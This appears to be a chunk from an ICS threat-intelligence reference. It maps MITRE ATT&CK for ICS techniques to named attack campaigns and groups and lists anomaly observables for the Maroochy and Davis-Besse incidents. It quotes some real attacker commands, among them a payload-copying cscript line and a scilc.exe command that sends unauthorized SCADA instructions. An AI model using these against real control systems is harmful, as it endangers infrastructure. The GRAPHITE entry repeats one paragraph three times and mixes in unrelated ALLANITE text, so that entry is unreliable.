---
tool: CyOTE_Tool_45
section: related_cases
chunk_id: af30d071587f
timestamp: 2025-06-23 19:21:46
---

> **Summary:** # 🧾 Related ATT&CK Campaigns and Cases   ## Maroochy Water Breach  - T0813 - Denial of Control: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.(Citation: Marshall Ab...

# 🧾 Related ATT&CK Campaigns and Cases


## Maroochy Water Breach

- T0813 - Denial of Control: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.(Citation: Marshall Abrams July 2008)

- T0815 - Denial of View: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.(Citation: Marshall Abrams July 2008)

- T0822 - External Remote Services: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary gained remote computer access to the system over radio.(Citation: Marshall Abrams July 2008)

- T0836 - Modify Parameter: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed for changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community.(Citation: Marshall Abrams July 2008)

- T0838 - Modify Alarm Settings: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary disabled alarms at four pumping stations, preventing notifications to the central computer.(Citation: Marshall Abrams July 2008)

- T0848 - Rogue Master: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary falsified network addresses in order to send false data and instructions to pumping stations.(Citation: Marshall Abrams July 2008)

- T0855 - Unauthorized Command Message: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.(Citation: Marshall Abrams July 2008)

- T0856 - Spoof Reporting Message: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.(Citation: Marshall Abrams July 2008)

- T0860 - Wireless Compromise: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary used a two-way radio to communicate with and set the frequencies of Maroochy Shire's repeater stations.(Citation: Marshall Abrams July 2008)

- T0864 - Transient Cyber Asset: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.(Citation: Marshall Abrams July 2008)

- T0878 - Alarm Suppression: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary suppressed alarm reporting to the central computer.(Citation: Marshall Abrams July 2008)

- T0879 - Damage to Property: In the [Maroochy Water Breach](https://attack.mitre.org/campaigns/C0020), the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. The raw sewage affected local parks, rivers, and even a local hotel. This resulted in harm to marine life and produced a sickening stench from the community's affected rivers.(Citation: Marshall Abrams July 2008)

## 2016 Ukraine Electric Power Attack

- T0807 - Command-Line Interface: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) supplied the name of the payload DLL to [Industroyer](https://attack.mitre.org/software/S0604) via a command line parameter.(Citation: ESET Industroyer)

- T0849 - Masquerading: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking.(Citation: Dragos Crashoverride 2018)

- T0853 - Scripting: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.(Citation: Dragos Crashoverride 2018)

- T0859 - Valid Accounts: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) used valid accounts to laterally move through VPN connections and dual-homed systems.(Citation: Dragos Crashoverride 2018)

- T0867 - Lateral Tool Transfer: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: `cscript C:\Backinfo\ufn.vbs C:\Backinfo\101.dll C:\Delta\101.dll`(Citation: Dragos Crashoverride 2018)

- T0886 - Remote Services: During the [2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025), [Sandworm Team](https://attack.mitre.org/groups/G0034) used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network.(Citation: Dragos Crashoverride 2018)

## 2015 Ukraine Electric Power Attack

- T0803 - Block Command Message: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. (Citation: Ukraine15 - EISAC - 201603)

- T0804 - Block Reporting Message: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable. (Citation: Ukraine15 - EISAC - 201603)

- T0805 - Block Serial COM: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) overwrote the serial-to-ethernet converter firmware, rendering the devices not operational. This meant that communication to the downstream serial devices was either not possible or more difficult. (Citation: Booz Allen Hamilton)

- T0813 - Denial of Control: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [KillDisk](https://attack.mitre.org/software/S0607) rendered devices that were necessary for remote recovery unusable, including at least one RTU. Additionally, [Sandworm Team](https://attack.mitre.org/groups/G0034) overwrote the firmware for serial-to-ethernet converters, denying operators control of the downstream devices. (Citation: Booz Allen Hamilton)(Citation: Ukraine15 - EISAC - 201603)

- T0814 - Denial of Service: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), power company phone line operators were hit with a denial of service attack so that they couldn’t field customers’ calls about outages. Operators were also denied service to their downstream devices when their serial-to-ethernet converters had their firmware overwritten, which bricked the devices. (Citation: Ukraine15 - EISAC - 201603)

- T0816 - Device Restart/Shutdown: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. (Citation: Ukraine15 - EISAC - 201603)(Citation: Booz Allen Hamilton)

- T0822 - External Remote Services: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. (Citation: Booz Allen Hamilton)

- T0823 - Graphical User Interface: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) utilized HMI GUIs in the SCADA environment to open breakers. (Citation: Ukraine15 - EISAC - 201603)

- T0826 - Loss of Availability: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. (Citation: Ukraine15 - EISAC - 201603)(Citation: Booz Allen Hamilton)

- T0827 - Loss of Control: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. (Citation: Ukraine15 - EISAC - 201603)

- T0828 - Loss of Productivity and Revenue: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. (Citation: Ukraine15 - EISAC - 201603)(Citation: Booz Allen Hamilton)

- T0831 - Manipulation of Control: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) opened live breakers via remote commands to the HMI, causing blackouts. (Citation: Ukraine15 - EISAC - 201603)

- T0846 - Remote System Discovery: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) remotely discovered operational assets once on the OT network. (Citation: Charles McLellan March 2016) (Citation: Booz Allen Hamilton)

- T0855 - Unauthorized Command Message: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. (Citation: Ukraine15 - EISAC - 201603)

- T0857 - System Firmware: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. (Citation: Ukraine15 - EISAC - 201603)

- T0859 - Valid Accounts: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications.  (Citation: Ukraine15 - EISAC - 201603)(Citation: Booz Allen Hamilton)

- T0867 - Lateral Tool Transfer: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) moved their tools laterally within the ICS network. (Citation: Booz Allen Hamilton)

- T0884 - Connection Proxy: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) established an internal proxy prior to the installation of backdoors within the network. (Citation: Booz Allen Hamilton)

- T0885 - Commonly Used Port: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) used port 443 to communicate with their C2 servers. (Citation: Booz Allen Hamilton)

- T0886 - Remote Services: During the [2015 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0028), [Sandworm Team](https://attack.mitre.org/groups/G0034) used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. (Citation: Andy Greenberg June 2017)

## Triton Safety Instrumented System Attack

- T0807 - Command-Line Interface: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088)’ tool took one option from the command line, which was a single IP address of the target Triconex device.(Citation: FireEye TRITON Dec 2017)

- T0828 - Loss of Productivity and Revenue: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) tripped a controller into a failed safe state, which caused an automatic shutdown of the plant, this resulted in a pause of plant operations for more than a week. Thereby impacting industrial processes and halting productivity.(Citation: FireEye TRITON Dec 2017)

- T0830 - Adversary-in-the-Middle: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) changed phone numbers tied to certain specific accounts in a designated contact list. They then used the changed phone numbers to redirect network traffic to websites controlled by them, thereby allowing them to capture and use any login codes sent to the devices via text message.(Citation: Triton-EENews-2017)

- T0843 - Program Download: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) downloaded multiple rounds of control logic to the Safety Instrumented System (SIS) controllers through a program append operation.(Citation: FireEye TRITON Dec 2017)

- T0853 - Scripting: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) used a publicly available PowerShell-based tool, WMImplant.(Citation: FireEye TEMP.Veles 2018)

- T0855 - Unauthorized Command Message: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) leveraged [Triton](https://attack.mitre.org/software/S1009) to send unauthorized command messages to the Triconex safety controllers.(Citation: FireEye TRITON 2018)

- T0859 - Valid Accounts: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) used valid credentials when laterally moving through RDP jump boxes into the ICS environment.(Citation: FireEye TRITON 2018)

- T0867 - Lateral Tool Transfer: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) made attempts on multiple victim machines to transfer and execute the WMImplant tool.(Citation: FireEye TEMP.Veles 2018)

- T0872 - Indicator Removal on Host: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) would programmatically return the controller to a normal running state if the [Triton](https://attack.mitre.org/software/S1009) malware failed. If the controller could not recover in a defined time window, [TEMP.Veles](https://attack.mitre.org/groups/G0088) programmatically overwrote their malicious program with invalid data.(Citation: FireEye TRITON Dec 2017)

- T0886 - Remote Services: In the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030), [TEMP.Veles](https://attack.mitre.org/groups/G0088) utilized remote desktop protocol (RDP) jump boxes, poorly configured OT firewalls (Citation: Triton-EENews-2017), along with other traditional malware backdoors, to move into the ICS environment.(Citation: FireEye TRITON 2018)(Citation: Triton-EENews-2017)

## Unitronics Defacement Campaign

- T0812 - Default Credentials: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) discovered and exploited default credentials found on many Unitronics [Programmable Logic Controller (PLC)](https://attack.mitre.org/assets/A0003) [Human-Machine Interface (HMI)](https://attack.mitre.org/assets/A0002). For many of these devices, the default password was set to ‘1111’.(Citation: CISA AA23-335A IRGC-Affiliated December 2023)(Citation: CISA Unitronics November 2023)

- T0814 - Denial of Service: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) defaced controllers’ [Human-Machine Interface (HMI)](https://attack.mitre.org/assets/A0002), which prevented multiple entities from being able to operate their devices normally.(Citation: CISA AA23-335A IRGC-Affiliated December 2023)(Citation: CISA Unitronics November 2023)(Citation: Jamie Tarabay and Katrina Manson December 2023)(Citation: Frank Bajak and Marc Levy December 2023) Additionally, the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) caused a communications failure in a remote pumping station.(Citation: WPXI Aliquippa Water November 2023)

- T0826 - Loss of Availability: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) caused multiple businesses to halt operations due to the unavailability of the [Programmable Logic Controller (PLC)](https://attack.mitre.org/assets/A0003) and [Human-Machine Interface (HMI)](https://attack.mitre.org/assets/A0002). These victims covered multiple sectors.(Citation: Jamie Tarabay and Katrina Manson December 2023)

- T0828 - Loss of Productivity and Revenue: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) caused multiple businesses to halt operations in their industrial environments, impacting their typical business operations. These victims covered multiple sectors.(Citation: Jamie Tarabay and Katrina Manson December 2023)

- T0829 - Loss of View: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) replaced the existing graphic on the [Programmable Logic Controller (PLC)](https://attack.mitre.org/assets/A0003) [Human-Machine Interface (HMI)](https://attack.mitre.org/assets/A0002) with their own, thereby preventing PLC owners and operators from viewing PLC information on the HMI.(Citation: CISA AA23-335A IRGC-Affiliated December 2023)(Citation: Jamie Tarabay and Katrina Manson December 2023) 

- T0883 - Internet Accessible Device: During the [Unitronics Defacement Campaign](https://attack.mitre.org/campaigns/C0031), the [CyberAv3ngers](https://attack.mitre.org/groups/G1027) exploited devices connected to the public internet, such as internet connected Unitronics [Programmable Logic Controller (PLC)](https://attack.mitre.org/assets/A0003) with [Human-Machine Interface (HMI)](https://attack.mitre.org/assets/A0002) and networking equipment such as cellular modems found in OT environments.(Citation: CISA AA23-335A IRGC-Affiliated December 2023)(Citation: Lisa Zahner December 2023)

## 2022 Ukraine Electric Power Attack

- T0807 - Command-Line Interface: During the [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034), [Sandworm Team](https://attack.mitre.org/groups/G0034) leveraged the SCIL-API on the MicroSCADA platform to execute commands through the `scilc.exe` binary.(Citation: Mandiant-Sandworm-Ukraine-2022)

- T0853 - Scripting: During the [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034), [Sandworm Team](https://attack.mitre.org/groups/G0034) utilizes a Visual Basic script `lun.vbs` to execute `n.bat` which then executed the MicroSCADA `scilc.exe` command.(Citation: Mandiant-Sandworm-Ukraine-2022)

- T0855 - Unauthorized Command Message: During the [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034), [Sandworm Team](https://attack.mitre.org/groups/G0034) used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices.(Citation: Mandiant-Sandworm-Ukraine-2022)

- T0894 - System Binary Proxy Execution: During the [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034), [Sandworm Team](https://attack.mitre.org/groups/G0034) executed a MicroSCADA application binary `scilc.exe` to send a predefined list of SCADA instructions specified in a file defined by the adversary, `s1.txt`. The executed command `C:\sc\prog\exec\scilc.exe -do pack\scil\s1.txt` leverages the SCADA software to send unauthorized command messages to remote substations.(Citation: Mandiant-Sandworm-Ukraine-2022)

- T0895 - Autorun Image: During the [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034), [Sandworm Team](https://attack.mitre.org/groups/G0034) used existing hypervisor access to map an ISO image named `a.iso` to a virtual machine running a SCADA server. The SCADA server’s operating system was configured to autorun CD-ROM images, and as a result, a malicious VBS script on the ISO image was automatically executed.(Citation: Mandiant-Sandworm-Ukraine-2022)

## FrostyGoop Incident

- T0826 - Loss of Availability: During [FrostyGoop Incident](https://attack.mitre.org/campaigns/C0041), the adversary modified victim control system parameters resulting in the loss of heating services to impacted district heating customers.(Citation: Dragos FROSTYGOOP 2024)

- T0829 - Loss of View: During [FrostyGoop Incident](https://attack.mitre.org/campaigns/C0041), the adversary initiated a firmware downgrade on victim devices to a version lacking monitoring.(Citation: Dragos FROSTYGOOP 2024)

- T0836 - Modify Parameter: In [FrostyGoop Incident](https://attack.mitre.org/campaigns/C0041), the adversary caused the victim controllers to report incorrect measurements by modifying parameters.(Citation: Dragos FROSTYGOOP 2024)

- T0857 - System Firmware: During [FrostyGoop Incident](https://attack.mitre.org/campaigns/C0041), the adversary initiated a firmware downgrade on impacted devices.(Citation: Dragos FROSTYGOOP 2024)

## Lazarus Group

- T0865 - Spearphishing Attachment: [Lazarus Group](https://attack.mitre.org/groups/G0032) has been observed targeting organizations using spearphishing documents with embedded malicious payloads. (Citation: Novetta Threat Research Group February 2016) Highly targeted spear phishing campaigns have been conducted against a U.S. electric grid company. (Citation: Eduard Kovacs March 2018)

## Sandworm Team

- T0807 - Command-Line Interface: [Sandworm Team](https://attack.mitre.org/groups/G0034) uses the MS-SQL server xp_cmdshell command, and PowerShell to execute commands. (Citation: Dragos October 2018)

- T0819 - Exploit Public-Facing Application: [Sandworm Team](https://attack.mitre.org/groups/G0034) actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet. (Citation: ICS-CERT December 2014) (Citation: ICS CERT September 2018)

- T0884 - Connection Proxy: [Sandworm Team](https://attack.mitre.org/groups/G0034) establishes an internal proxy prior to the installation of backdoors within the network. (Citation: Dragos Inc. June 2017)

## Dragonfly

- T0817 - Drive-by Compromise: [Dragonfly](https://attack.mitre.org/groups/G0035) utilized watering hole attacks on energy sector websites by injecting a redirect iframe to deliver [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) or [Trojan.Karagany](https://attack.mitre.org/software/S0094). (Citation: Symantec Security Response July 2014)

- T0862 - Supply Chain Compromise: [Dragonfly](https://attack.mitre.org/groups/G0035) trojanized legitimate ICS equipment providers software packages available for download on their websites.(Citation: Symantec Security Response July 2014)

## OilRig

- T0817 - Drive-by Compromise: [OilRig](https://attack.mitre.org/groups/G0049) has been seen utilizing watering hole attacks to collect credentials which could be used to gain access into ICS networks. (Citation: Eduard Kovacs May 2018)

- T0853 - Scripting: [OilRig](https://attack.mitre.org/groups/G0049) has embedded a macro within spearphishing attachments that has been made up of both a VBScript and a PowerShell script.(Citation: Robert Falcone, Bryan Lee May 2016)

- T0859 - Valid Accounts: [OilRig](https://attack.mitre.org/groups/G0049) utilized stolen credentials to gain access to victim machines.(Citation: Dragos)

- T0865 - Spearphishing Attachment: [OilRig](https://attack.mitre.org/groups/G0049) used spearphishing emails with malicious Microsoft Excel spreadsheet attachments. (Citation: Robert Falcone, Bryan Lee May 2016)

- T0869 - Standard Application Layer Protocol: [OilRig](https://attack.mitre.org/groups/G0049) communicated with its command and control using HTTP requests. (Citation: Robert Falcone, Bryan Lee May 2016)

## APT33

- T0852 - Screen Capture: [APT33](https://attack.mitre.org/groups/G0064) utilize backdoors capable of capturing screenshots once installed on a system. (Citation: Jacqueline O'Leary et al. September 2017)(Citation: Junnosuke Yagi March 2017)

- T0853 - Scripting: [APT33](https://attack.mitre.org/groups/G0064) utilized PowerShell scripts to establish command and control and install files for execution. (Citation: Symantec March 2019) (Citation: Dragos)

- T0865 - Spearphishing Attachment: [APT33](https://attack.mitre.org/groups/G0064) sent spear phishing emails containing links to HTML application files, which were embedded with malicious code. (Citation: Jacqueline O'Leary et al. September 2017) [APT33](https://attack.mitre.org/groups/G0064) has conducted targeted spear phishing campaigns against U.S. government agencies and private sector companies. (Citation: Andy Greenburg June 2019)

## TEMP.Veles

- T0817 - Drive-by Compromise: [TEMP.Veles](https://attack.mitre.org/groups/G0088) utilizes watering hole websites to target industrial employees. (Citation: Chris Bing May 2018)

- T0862 - Supply Chain Compromise: [TEMP.Veles](https://attack.mitre.org/groups/G0088) targeted several ICS vendors and manufacturers. (Citation: Dragos Threat Intelligence August 2019)

## ALLANITE

- T0817 - Drive-by Compromise: [ALLANITE](https://attack.mitre.org/groups/G1000) leverages watering hole attacks to gain access into electric utilities. (Citation: Eduard Kovacs May 2018)

- T0852 - Screen Capture: [ALLANITE](https://attack.mitre.org/groups/G1000) has been identified to collect and distribute screenshots of ICS systems such as HMIs. (Citation: Dragos) (Citation: ICS-CERT October 2017)

- T0859 - Valid Accounts: [ALLANITE](https://attack.mitre.org/groups/G1000) utilized credentials collected through phishing and watering hole attacks. (Citation: Dragos)

- T0865 - Spearphishing Attachment: [ALLANITE](https://attack.mitre.org/groups/G1000) utilized spear phishing to gain access into energy sector environments. (Citation: Jeff Jones May 2018)

## Graphite

- T0819 - Exploit Public-Facing Application: GRAPHITE is focused on energy and industrial organizations in Eastern Europe and the Middle East, particularly those involved in the military conflict in Ukraine. Since 2022, the group has conducted spear-phishing campaigns to steal credentials, often exploiting vulnerabilities like a no-click flaw in Microsoft Outlook.  The group initially relied on compromised Ubiquiti Edge Routers networks to distribute malware and maintain command-and-control (C2) operations. However, after a U.S.-led takedown of their botnet in early 2024, GRAPHITE shifted to using legitimate internet services, such as API endpoint testing platforms and GitHub, to stage their attacks. GRAPHITE is capable of Stage 1 of the ICS Cyber Kill Chain. While they have not yet demonstrated disruptive ICS capabilities, their intelligence-gathering efforts suggest they could enable future cyber operations against industrial targets. Organizations involved in energy production and infrastructure, especially those linked to Ukraine, should remain vigilant against this group. US officials told the media in July 2017 these adversaries gained access to business and administrative systems, not operations networks. Since then, third-party reporting indicates ALLANITE has gathered information directly from ICS networks, which Dragos can independently confirm.

- T0859 - Valid Accounts: GRAPHITE is focused on energy and industrial organizations in Eastern Europe and the Middle East, particularly those involved in the military conflict in Ukraine. Since 2022, the group has conducted spear-phishing campaigns to steal credentials, often exploiting vulnerabilities like a no-click flaw in Microsoft Outlook.  The group initially relied on compromised Ubiquiti Edge Routers networks to distribute malware and maintain command-and-control (C2) operations. However, after a U.S.-led takedown of their botnet in early 2024, GRAPHITE shifted to using legitimate internet services, such as API endpoint testing platforms and GitHub, to stage their attacks. GRAPHITE is capable of Stage 1 of the ICS Cyber Kill Chain. While they have not yet demonstrated disruptive ICS capabilities, their intelligence-gathering efforts suggest they could enable future cyber operations against industrial targets. Organizations involved in energy production and infrastructure, especially those linked to Ukraine, should remain vigilant against this group. US officials told the media in July 2017 these adversaries gained access to business and administrative systems, not operations networks. Since then, third-party reporting indicates ALLANITE has gathered information directly from ICS networks, which Dragos can independently confirm.

- T0865 - Spearphishing Attachment: GRAPHITE is focused on energy and industrial organizations in Eastern Europe and the Middle East, particularly those involved in the military conflict in Ukraine. Since 2022, the group has conducted spear-phishing campaigns to steal credentials, often exploiting vulnerabilities like a no-click flaw in Microsoft Outlook.  The group initially relied on compromised Ubiquiti Edge Routers networks to distribute malware and maintain command-and-control (C2) operations. However, after a U.S.-led takedown of their botnet in early 2024, GRAPHITE shifted to using legitimate internet services, such as API endpoint testing platforms and GitHub, to stage their attacks. GRAPHITE is capable of Stage 1 of the ICS Cyber Kill Chain. While they have not yet demonstrated disruptive ICS capabilities, their intelligence-gathering efforts suggest they could enable future cyber operations against industrial targets. Organizations involved in energy production and infrastructure, especially those linked to Ukraine, should remain vigilant against this group. US officials told the media in July 2017 these adversaries gained access to business and administrative systems, not operations networks. Since then, third-party reporting indicates ALLANITE has gathered information directly from ICS networks, which Dragos can independently confirm.

## INSIDER ATTACK ON THE MAROOCHY SHIRE SEWERAGE CONTROL SYSTEM IN 2000

- T0813 - Denial of Control: Anomalous System Behavior on Local Host: Engineering Workstation (EWS): Failure of Commands to Reach Control System

- T0814 - Denial of Service: Anomalous System Behavior on Local Host: Engineering Workstation (EWS): Failure of Commands to Reach Control System

- T0815 - Denial of View: Anomalous System Behavior on Local Host: Anomalous Increase in Logon Failures

- T0822 - External Remote Services: Anomalous System Behavior on Local Host: Anomalous Commands Issued to Controlled Process: To Sewage Pumping Stations Over Ultra High Frequency (UHF) Radio: Motorola M120 Two-Way Radio: Property of Integrator: Hunter Watertech

- T0828 - Loss of Productivity and Revenue: Anomalous Business Disruption: Hunter Watertech Lost Approximately $292,084

- T0829 - Loss of View: Anomalous Behavior of Controlled Process: Anomalous Pump Station Behavior: Controlled Process Operating in Degraded State: Manual Operation

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Anomalous Pump Behavior: Pump Station Lockups

- T0836 - Modify Parameter: Anomalous Behavior of Controlled Process: Anomalous Pump Behavior: Pumps Stopped When They Were Intended to Be Running

- T0838 - Modify Alarm Settings: Anomalous System Behavior on Local Host: Engineering Workstation (EWS) Receives Anomalous Messages: From Remote Terminal Unit (RTU): Protective Distribution System (PDS) Compact 500: From Anomalous Pumping Station Address: Pumping Station 4: Alarms Disabled

- T0848 - Rogue Master: Anomalous Behavior of Controlled Process: Anomalous Pump Behavior: Pump Station Lockups

- T0855 - Unauthorized Command Message: Anomalous Behavior of Controlled Process: Anomalous Pump Behavior: Pump Station Lockups

- T0856 - Spoof Reporting Message: Anomalous Control System Radio Traffic: Over Ultra High Frequency (UHF): From Anomalous Pumping Station Network Address: Pumping Station 14: To Unspecified Pumping Stations

- T0860 - Wireless Compromise: Anomalous Control System Radio Traffic: Over Ultra High Frequency (UHF): To Repeater Station: Buderim

- T0864 - Transient Cyber Asset: Anomalous System Behavior on Local Host: Anomalous Commands Issued to Controlled Process: To Sewage Pumping Stations Over Ultra High Frequency (UHF) Radio: Motorola M120 Two-Way Radio: Property of Integrator: Hunter Watertech

- T0878 - Alarm Suppression: Anomalous Control System Radio Traffic: Over Ultra High Frequency (UHF): From Anomalous Pumping Station Address: Pumping Station 4

- T0879 - Damage to Property: Anomalous Behavior of Controlled Process: Anomalous Pump Station Behavior: At Boomba Street: Controlled Process Failure: Overflow of Untreated Sewage: Approximately 211,337 Gallons of Sewage Overflowed Into the Surrounding Open Drain and Creek

## SQL SLAMMER WORM INFECTION OF DAVIS-BESSE NUCLEAR POWER PLANT 2003

- T0819 - Exploit Public-Facing Application: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

- T0826 - Loss of Availability: Anomalous System Behavior on Local Device: Local Area Network (LAN) Gateway: Increase in System Resource Utilization: Increase in Central Processing Unit (CPU) Utilization

- T0829 - Loss of View: Anomalous System Behavior on Local Device: Local Area Network (LAN) Gateway: Increase in System Resource Utilization: Increase in Central Processing Unit (CPU) Utilization

- T0834 - Native API: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

- T0846 - Remote System Discovery: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

- T0853 - Scripting: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): On Microsoft Structured Query Language (SQL) Server 2000: GetProcAddress()

